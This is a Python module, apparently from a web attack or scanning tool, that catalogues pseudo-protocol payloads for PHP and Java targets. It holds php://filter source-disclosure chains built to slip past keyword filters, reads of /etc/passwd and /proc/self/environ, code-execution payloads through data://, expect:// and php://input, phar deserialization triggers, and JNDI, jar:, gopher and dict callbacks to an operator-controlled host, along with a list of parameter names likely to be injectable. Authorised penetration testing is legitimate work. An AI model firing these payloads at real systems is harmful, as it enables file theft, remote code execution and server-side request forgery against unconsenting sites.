"""What a pseudo-protocol can be asked to do.

A parameter that takes a filename or a URL is not one feature, it is a dispatch
point: whichever runtime sits behind it decides what `php://filter` or
`jar:http://...!/` means, and each runtime has its own set. The payloads here are
grouped by what they can be used for, not by which runtime owns them, because
the test is the same in each case - plant one, look at what comes back.

Placeholders:

    {file}      a path on the target worth reading
    {callback}  an address the tool can watch
    {code}      the payload the exploit wants to run, base64-encoded by the caller
    {upload}    a path the operator knows exists and can be reached (--upload)

A wrapper whose precondition is not met is skipped rather than sent: a `phar://`
probe against a path that was never uploaded proves nothing and costs a request.
"""

from __future__ import annotations

from dataclasses import dataclass, field

# ------------------------------------------------------------------- targets

# Files worth asking for. A PHP application usually reads its own sources; a
# read primitive that lands anywhere else still proves the wrapper works.
FILE_TARGETS: tuple[str, ...] = (
    "index.php",
    "config.php",
    "../index.php",
    "/etc/passwd",
)

# Reads that only exist on one family of host, tried after the general ones.
EXTRA_FILE_TARGETS: tuple[str, ...] = (
    "/proc/self/environ",
    "/etc/hostname",
    "/var/www/html/index.php",
    "index",
)

# ---------------------------------------------------------------- signatures

PASSWD_SIGNATURE = "root:x:0:0"
PHP_SOURCE_SIGNATURE = "<?php"
JAVA_CLASS_MAGIC = "cafebabe"
PHPINFO_SIGNATURE = "phpinfo"

# ---------------------------------------------------------------- the wrappers


@dataclass(frozen=True)
class Wrapper:
    """One way of asking a runtime for something it did not mean to give.

    `family` groups wrappers that answer the same question, so the engine can
    stop asking once one of them has answered. `needs` names the precondition
    that has to hold before sending it at all.
    """

    name: str
    payload: str
    family: str
    signatures: tuple[str, ...] = ()
    needs: str = ""
    note: str = ""
    # A payload that only proves itself when the response is decoded first.
    decoded: bool = False
    # Set when the payload reaches out - the proof is a callback, not a body.
    remote: bool = False


# PHP: read through the filter chain. The value is what the application would
# have passed to include()/file_get_contents(); the filters are applied to the
# bytes before they reach it.
PHP_FILTER_READ: tuple[Wrapper, ...] = (
    Wrapper(
        "php-filter-base64",
        "php://filter/convert.base64-encode/resource={file}",
        family="php-read",
        signatures=("PD9waHA", "cm9vdDp4"),
        note="the canonical source disclosure: the file arrives base64-encoded",
        decoded=True,
    ),
    Wrapper(
        "php-filter-base64-read",
        "php://filter/read=convert.base64-encode/resource={file}",
        family="php-read",
        signatures=("PD9waHA", "cm9vdDp4"),
        note="same, written with the explicit read= parameter",
        decoded=True,
    ),
    Wrapper(
        "php-filter-double-base64",
        "php://filter/convert.base64-encode/convert.base64-encode/resource={file}",
        family="php-read",
        signatures=("UEQ5d2FIQT0",),
        note="encoded twice, for filters that decode one layer",
        decoded=True,
    ),
    Wrapper(
        "php-filter-iconv-utf16",
        "php://filter/convert.iconv.utf-8.utf-16/resource={file}",
        family="php-read",
        signatures=(),
        note="a transform that mangles enough to walk past keyword filters",
    ),
    Wrapper(
        "php-filter-strip-tags",
        "php://filter/string.strip_tags/resource={file}",
        family="php-read",
        signatures=(),
        note="strips PHP tags, which is how a source read survives a tag filter",
    ),
    Wrapper(
        "php-filter-rot13",
        "php://filter/read=string.rot13/resource={file}",
        family="php-read",
        signatures=(),
        note="rot13, for a filter that only looks for readable words",
    ),
    Wrapper(
        "php-filter-quoted-printable",
        "php://filter/convert.quoted-printable-encode/resource={file}",
        family="php-read",
        signatures=("=3C=3Fphp",),
        note="quoted-printable, which hides the opening tag of a source file",
    ),
    Wrapper(
        "php-filter-mixed",
        "php://filter/convert.iconv.utf-8.utf-16/convert.base64-encode/resource={file}",
        family="php-read",
        signatures=(),
        note="two filters in one chain, for a rule set that knows the usual one",
    ),
)

# PHP: plain reads, no filter involved.
PHP_PLAIN_READ: tuple[Wrapper, ...] = (
    Wrapper("php-filter-resource", "php://filter/resource={file}", family="php-read", signatures=("<?php", "root:x:0:0")),
    Wrapper("file-scheme", "file:///{file}", family="read", signatures=("<?php", "root:x:0:0")),
    Wrapper("file-absolute", "file://{file}", family="read", signatures=("<?php", "root:x:0:0")),
    Wrapper("bare-path", "{file}", family="read", signatures=("<?php", "root:x:0:0")),
    Wrapper("file-system", "file:///etc/passwd", family="read", signatures=("root:x:0:0",)),
    Wrapper("plain-system", "/etc/passwd", family="read", signatures=("root:x:0:0",)),
)

# PHP: code execution, when the runtime is configured to allow it. Every one of
# these is off by default in a modern PHP; they are worth one request each.
PHP_CODE: tuple[Wrapper, ...] = (
    Wrapper(
        "data-base64",
        "data://text/plain;base64,{code}",
        family="php-exec",
        signatures=(PHPINFO_SIGNATURE,),
        note="data:// with allow_url_include: code straight out of the URL",
    ),
    Wrapper(
        "data-plain",
        "data://text/plain,<?php phpinfo();?>",
        family="php-exec",
        signatures=(PHPINFO_SIGNATURE,),
        note="the same without base64, when the filter does not like equals signs",
    ),
    Wrapper(
        "data-text-plain-exec",
        "data:text/plain;base64,{code}",
        family="php-exec",
        signatures=(PHPINFO_SIGNATURE,),
        note="the other spelling of the data URI media type",
    ),
    Wrapper(
        "expect",
        "expect://id",
        family="php-exec",
        signatures=("uid=",),
        note="expect:// runs a command, when the extension is present",
        remote=False,
    ),
    Wrapper(
        "php-input",
        "php://input",
        family="php-exec",
        signatures=(PHPINFO_SIGNATURE,),
        note="php://input runs the request body; the body has to carry the code",
    ),
)

# PHP: archives and other wrappers that reach a file through a container.
PHP_ARCHIVE: tuple[Wrapper, ...] = (
    Wrapper("zip", "zip://{upload}#index.php", family="php-archive", signatures=("<?php",), needs="upload",
            note="zip:// reads inside an archive the target already has"),
    Wrapper("phar", "phar://{upload}/index.php", family="php-archive", signatures=("<?php",), needs="upload",
            note="phar:// also deserializes metadata, which is the real reason to try it"),
    Wrapper("phar-stub", "phar://{upload}", family="php-archive", signatures=(), needs="upload",
            note="a phar with no inner path, which triggers metadata deserialization on its own"),
    Wrapper("compress-zlib", "compress.zlib://{file}", family="php-archive", signatures=("<?php", "root:x:0:0")),
    Wrapper("compress-bzip2", "compress.bzip2://{file}", family="php-archive", signatures=("<?php", "root:x:0:0")),
    Wrapper("glob", "glob:///etc/passwd*", family="php-archive", signatures=("passwd",),
            note="glob:// lists what a directory holds, a directory listing without a read"),
    Wrapper("rar", "rar://{upload}", family="php-archive", signatures=(), needs="upload",
            note="rar:// for a target that has the extension"),
    Wrapper("ssh2", "ssh2://user:pass@127.0.0.1/etc/passwd", family="php-archive", signatures=("root:x:0:0",)),
    Wrapper("ogg", "ogg://{callback}/x.ogg", family="php-archive", signatures=(), remote=True,
            note="ogg:// makes the target fetch, like a slow http client"),
    Wrapper("ftp", "ftp://{callback}/x", family="php-archive", signatures=(), remote=True),
    Wrapper("http-plain", "http://{callback}/x", family="php-archive", signatures=(), remote=True),
)

# Java: what a URL opened by the JVM understands. These matter wherever a
# parameter reaches new URL(...) - an SSRF in a Java service, an XXE, a JNDI
# lookup, or a deserialization gadget that takes a codebase.
JAVA_URL: tuple[Wrapper, ...] = (
    Wrapper(
        "jar-remote",
        "jar:http://{callback}/x.jar!/",
        family="java-remote",
        remote=True,
        note="jar: downloads the archive before doing anything else - the fetch is the proof",
    ),
    Wrapper(
        "jar-remote-file",
        "jar:http://{callback}/x.jar!/payload.txt",
        family="java-remote",
        remote=True,
        note="the same, naming an entry inside the archive",
    ),
    Wrapper(
        "jar-remote-https",
        "jar:https://{callback}/x.jar!/",
        family="java-remote",
        remote=True,
    ),
    Wrapper(
        "jar-local",
        "jar:file:///{file}!/",
        family="java-read",
        signatures=("PK\x03\x04",),
        note="jar: over a local archive, which reads a file the same way",
    ),
    Wrapper(
        "jrt-module",
        "jrt:/java.base/java/lang/String.class",
        family="java-read",
        signatures=(JAVA_CLASS_MAGIC,),
        note="jrt:/ reads inside the JDK's own modules (Java 9 and later)",
    ),
    Wrapper(
        "jrt-modules",
        "jrt:/modules/java.base/java/lang/String.class",
        family="java-read",
        signatures=(JAVA_CLASS_MAGIC,),
        note="the other spelling of a jrt path",
    ),
    Wrapper(
        "netdoc",
        "netdoc:///etc/passwd",
        family="java-read",
        signatures=(PASSWD_SIGNATURE,),
        note="netdoc:// is a file read on older JDKs",
    ),
    Wrapper(
        "netdoc-short",
        "netdoc:/etc/passwd",
        family="java-read",
        signatures=(PASSWD_SIGNATURE,),
    ),
    # A plain `file:///etc/passwd` is deliberately not here. PHP reads it just as
    # happily, so it proves nothing about which runtime is behind the parameter -
    # it lives with the neutral reads, where it is tried but decides nothing.
    Wrapper(
        "ldap-jndi",
        "ldap://{callback}/x",
        family="java-remote",
        remote=True,
        note="a JNDI lookup reaching out - the shape every log4shell-style bug takes",
    ),
    Wrapper(
        "rmi-jndi",
        "rmi://{callback}/x",
        family="java-remote",
        remote=True,
    ),
    Wrapper(
        "dns-jndi",
        "dns://{callback}",
        family="java-remote",
        remote=True,
    ),
    Wrapper(
        "iiop-jndi",
        "iiop://{callback}/x",
        family="java-remote",
        remote=True,
    ),
)

# Wrappers that exist to make something else happen, where the proof is a
# callback rather than a body.
GENERIC_REMOTE: tuple[Wrapper, ...] = (
    Wrapper("gopher", "gopher://{callback}/_GET / HTTP/1.0", family="generic-remote", remote=True,
            note="gopher writes raw bytes to a port, which is a whole HTTP request if you want one"),
    Wrapper("dict", "dict://{callback}:11211/stat", family="generic-remote", remote=True),
    Wrapper("tftp", "tftp://{callback}/x", family="generic-remote", remote=True),
)

WRAPPERS: tuple[Wrapper, ...] = (
    PHP_FILTER_READ + PHP_PLAIN_READ + PHP_CODE + PHP_ARCHIVE + JAVA_URL + GENERIC_REMOTE
)


def by_family(family: str) -> tuple[Wrapper, ...]:
    return tuple(wrapper for wrapper in WRAPPERS if wrapper.family == family)


def families() -> tuple[str, ...]:
    """The order the engine asks in: local reads first, then code, then remote.

    A local read costs one request and settles the parameter's nature; reaching
    out to a listener is only worth doing once the parameter is known to pass
    something through.
    """
    seen: list[str] = []
    for wrapper in WRAPPERS:
        if wrapper.family not in seen:
            seen.append(wrapper.family)
    return tuple(seen)


# Parameters that hold a path or a URL. The names an application gives these
# are the same ones an SSRF hides behind, plus the file-oriented ones.
LIKELY_PARAMS: frozenset[str] = frozenset(
    {
        "file", "path", "filename", "page", "include", "inc", "template", "tpl",
        "view", "load", "read", "doc", "document", "content", "src", "source",
        "url", "uri", "target", "dest", "destination", "next", "redirect",
        "image", "img", "avatar", "download", "export", "import", "lang",
        "module", "config", "theme", "layout", "partial", "resource", "data",
        "jsp", "class", "jar", "codebase", "location", "fallback",
    }
)


# ------------------------------------------------------------------- code

# What a code wrapper asks the target to run, base64-encoded. Kept as a
# parameter rather than a constant so a probe and an exploit can share it.
def php_code(marker: str) -> str:
    """PHP that prints a marker only this run would recognise."""
    return f"<?php echo '{marker}';phpinfo();?>"


@dataclass
class ProbeSet:
    """The wrappers worth trying for one target, in the order they will be tried."""

    wrappers: list[Wrapper] = field(default_factory=list)

    def add(self, *groups: tuple[Wrapper, ...]) -> "ProbeSet":
        for group in groups:
            self.wrappers.extend(group)
        return self
